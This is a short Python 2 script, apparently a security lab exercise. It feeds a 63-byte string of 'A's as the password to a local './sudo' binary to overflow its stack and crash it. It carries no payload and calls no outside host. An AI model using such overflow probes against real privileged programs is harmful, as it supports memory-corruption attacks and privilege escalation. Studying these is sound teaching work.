import os, sys


PATH_TO_SUDO = './sudo'


def crash_sudo():
	cmd = "ls" # arbitrary, just used to follow the proper usage of the program 
	password = "A" * 63 # we need at least 63 bytes to overflow RET register
	cmd_to_run = PATH_TO_SUDO + " " + password + " " + "\"" + cmd + "\"" # escape with parentheses
	os.system(cmd_to_run)
	return


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
